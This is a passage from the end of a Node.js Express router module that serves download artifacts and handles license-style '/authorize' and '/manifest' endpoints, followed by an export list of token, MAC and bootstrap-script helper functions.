        return res.status(404).json({ status: 'error', reason: 'not_found' });
    }
    try {
        const st = await fs.promises.stat(resolved);
        if (!st.isFile() || st.size !== expectedSize) {
            return res.status(404).json({ status: 'error', reason: 'not_found' });
        }
    } catch (_) {
        return res.status(404).json({ status: 'error', reason: 'not_found' });
    }
    res.setHeader('Content-Type', /\.zip$/i.test(requested) ? 'application/zip' : 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Accept-Ranges', 'bytes');
    return res.sendFile(resolved);
}

router.post('/authorize', async (req, res) => {
    const startedAt = Date.now();
    const clientIp = getClientIp(req);
    const userAgent = (req.headers && req.headers['user-agent']) || '';
    try {
        const result = await authorizeRequest(req.body || {}, clientIp, userAgent);
        if (!result || result.eauth) return sendEauth(res, startedAt);
        noStore(res);
        return res.status(result.status).json(result.body);
    } catch (err) {
        console.error('[bootstrap] authorize failed:', err && err.message ? err.message : err);
        return sendEauth(res, startedAt);
    }
});

router.post('/manifest', async (req, res) => {
    const startedAt = Date.now();
    const clientIp = getClientIp(req);
    const userAgent = (req.headers && req.headers['user-agent']) || '';
    try {
        const result = await manifestRequest(req.body || {}, clientIp, userAgent);
        if (!result || result.eauth) return sendEauth(res, startedAt);
        noStore(res);
        return res.status(result.status).json(result.body);
    } catch (err) {
        console.error('[bootstrap] manifest failed:', err && err.message ? err.message : err);
        return sendEauth(res, startedAt);
    }
});

router._internal = {
    authorizeRequest,
    manifestRequest,
    buildBootstrapScript,
    buildBootstrapStage0Script,
    artifactHandler,
    rootScriptHandler,
    getScriptRouteConfig,
    acceptsBootstrapScript,
    getReleaseConfig,
    getCamoufoxSidecarConfig,
    getCamoufoxMcpPatchConfig,
    createToken,
    parseToken,
    hashTokenSecret,
    manifestMacInput,
    createManifestMac,
    isLicenseExpired,
    timingSafeHexEqual,
    _resetForTests: () => {
        s_schemaPromise = null;
        s_tokenKey = null;
    },
};

module.exports = {
    router,
    scriptHandler,
    rootScriptHandler,
    artifactHandler,
    getScriptRouteConfig,
    _internal: router._internal,
};
